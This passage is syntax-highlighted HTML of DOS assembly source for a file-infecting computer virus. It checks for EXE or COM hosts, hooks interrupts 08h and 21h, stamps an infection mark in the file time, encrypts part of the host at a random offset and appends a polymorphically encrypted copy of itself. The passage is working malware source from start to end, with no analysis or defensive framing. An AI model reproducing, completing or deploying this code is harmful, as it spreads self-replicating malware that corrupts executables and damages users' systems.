         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">file_header_</span><span class="sc0">     </span><span class="sc1">; SI = offset of file_header_</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">file_header</span><span class="sc0">  </span><span class="sc1">; DI = offset of file_header</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">head_end</span><span class="sc4">-</span><span class="sc5">head_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">             </span><span class="sc1">; Clear direction flag</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move twenty-six bytes</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">examine_exe</span><span class="sc0">     </span><span class="sc1">; Found EXE signature? Jump to exa...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">],</span><span class="sc12">'MZ'</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">examine_com</span><span class="sc0">     </span><span class="sc1">; Didn't find EXE signature? Jump ...</span><span class="sc0">
</span><span class="sc5">examine_exe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">need_segovv</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">   </span><span class="sc1">; EXE executable</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exam_filesiz</span><span class="sc0">
</span><span class="sc5">examine_com</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">need_segovv</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; COM executable</span><span class="sc0">
</span><span class="sc5">exam_filesiz</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_eof</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Filesize too small?</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">sto_filesize</span><span class="sc0">    </span><span class="sc1">; Not zero? Jump to sto_filesize</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">; Filesize too small?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">infect_exit_</span><span class="sc0">    </span><span class="sc1">; Below? Jump to infect_exit_</span><span class="sc0">
</span><span class="sc5">sto_filesize</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc5">need_segovv</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; SI = executable</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply executable with two</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">prepare_file</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">infect_exit_</span><span class="sc0">    </span><span class="sc1">; Error? Jump to infect_exit_</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt_action</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; BX = decryptor's offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; SI = delta offset</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">virus_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">data_buffer</span><span class="sc0">  </span><span class="sc1">; DI = offset of data_buffer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppmle_gen</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AX = file's time</span><span class="sc0">
         </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00000001b</span><span class="sc0">    </span><span class="sc1">; Set infection mark</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_time</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store file's time</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save registers at stack</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">infect_file_</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_file_eof</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filesize_</span><span class="sc0">    </span><span class="sc1">; DX = offset of filesize_</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">      </span><span class="sc1">; Write two bytes</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; Add two to length of decryptor +...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">filesize_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store filesize_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">infect_exit_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">       </span><span class="sc1">; Load registers from stack</span><span class="sc0">
</span><span class="sc5">infect_exi</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sto_file_inf</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_int_add_</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ss__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; SS = stack segment</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">sp__</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; SP = stack pointer</span><span class="sc0">
         </span><span class="sc6">sti</span><span class="sc0">             </span><span class="sc1">; Set interrupt-enable flag</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">int21_exit_</span><span class="sc0">

</span><span class="sc5">set_file_eof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">        </span><span class="sc1">;  "     " "      "       "</span><span class="sc0">

</span><span class="sc5">set_file_pos</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX:DX = offset from origin of ne...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;   "   "   "     "     "    "    "</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">patch_ints</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Patch interrupt 08h and 21h</span><span class="sc0">
         </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">; Clear interrupt-enable flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_patch</span><span class="sc4">],</span><span class="sc2">11101001b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21_patch</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc5">int21_exit__</span><span class="sc4">-</span><span class="sc5">int21_patch</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_patch</span><span class="sc4">],</span><span class="sc2">11101001b</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int08_patch</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc5">int08_exit__</span><span class="sc4">-</span><span class="sc5">int08_patch</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">crypt_action</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Read plain data, encrypt it, wri...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">encrypt_stat</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; Host not encrypted</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">need_segovv</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">   </span><span class="sc1">; COM executable?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">crypt_com</span><span class="sc0">       </span><span class="sc1">; Equal? Jump to crypt_com</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Multiply with paragraphs</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">       </span><span class="sc1">; Header size</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">header_size_</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store header size</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">header_size</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;   "     "     "</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">no_relocatio</span><span class="sc0">    </span><span class="sc1">; No relocations? Jump to no_reloc...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Save CX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">file_header</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; CX:DX = offset from origin of ne...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Read four bytes</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">reloca_entry</span><span class="sc0">     </span><span class="sc1">; DX = offset of reloca_entry</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">; Load CX from stack</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">calc_relocat</span><span class="sc0">    </span><span class="sc1">; No error? Jump to calc_relocat</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">crypt_exit</span><span class="sc0">
</span><span class="sc5">calc_relocat</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reloca_entry</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">; No need to calculate the offset...?</span><span class="sc0">
         </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">no_calc_relo</span><span class="sc0">    </span><span class="sc1">; Not below? Jump to dont_mul_rel</span><span class="sc0">

         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Multiply high-order word of reloc...</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;    "     "   "   "     "</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;    "     "   "   "     "</span><span class="sc0">
         </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">;    "     "   "   "     "</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">reloca_entry</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_calc_relo</span><span class="sc0">    </span><span class="sc1">; Carry? Jump to no_calc_relo</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">header_size_</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Add headersize to offset of firs...</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_calc_relo</span><span class="sc0">    </span><span class="sc1">; Carry? Jump to no_calc_relo</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sub_head_siz</span><span class="sc0">
</span><span class="sc5">no_relocatio</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_relocati</span><span class="sc0">     </span><span class="sc1">; Equal? Jump to no_relocati</span><span class="sc0">
</span><span class="sc5">no_calc_relo</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">       </span><span class="sc1">; Set offset of first relocation e...</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">sub_head_siz</span><span class="sc0">
</span><span class="sc5">crypt_com</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">header_size_</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">; Set header size to zero</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">header_size</span><span class="sc4">],</span><span class="sc2">1ah</span><span class="sc0">   </span><span class="sc1">; Set header size to twenty-six</span><span class="sc0">
</span><span class="sc5">no_relocati</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">sub_head_siz</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">header_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Subtract header size from addres...</span><span class="sc0">
         </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">crypt_exit</span><span class="sc0">      </span><span class="sc1">; Below or equal? Jump to crypt_exit</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; CX = offset of first relocation ...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">57cfh</span><span class="sc0">        </span><span class="sc1">; Offset of first relocation entr...?</span><span class="sc0">
         </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">rnd_in_range</span><span class="sc0">    </span><span class="sc1">; Below? Jump to rnd_in_range</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">57cfh</span><span class="sc0">       </span><span class="sc1">; Random number within twenty-two ...</span><span class="sc0">
</span><span class="sc5">rnd_in_range</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Zero?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">crypt_exit</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to crypt_exit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crypt_length</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store length of encrypted/decryp...</span><span class="sc0">

         </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Subtract random number within ra...</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; AX = offset within first relocat...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">header_size</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Add header size to random number...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crypt_ptr</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">  </span><span class="sc1">; Store file pointer to encrypted/...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">         </span><span class="sc1">; Random number within two hundred...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase 8-bit random number</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">crypt_key</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Store encryption/decryption key</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">      </span><span class="sc1">; Read from file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">disk_action</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">crypt_exit</span><span class="sc0">      </span><span class="sc1">; Error? Jump to crypt_error</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; DI = offset of data_buffer</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">encrypt_host</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">disk_action</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">crypt_exit</span><span class="sc0">      </span><span class="sc1">; Error? Jump to crypt_error</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">encrypt_stat</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; Host encrypted</span><span class="sc0">
</span><span class="sc5">crypt_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Load AX from stack</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">disk_action</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Read/write encrypted data</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Save AX at stack</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
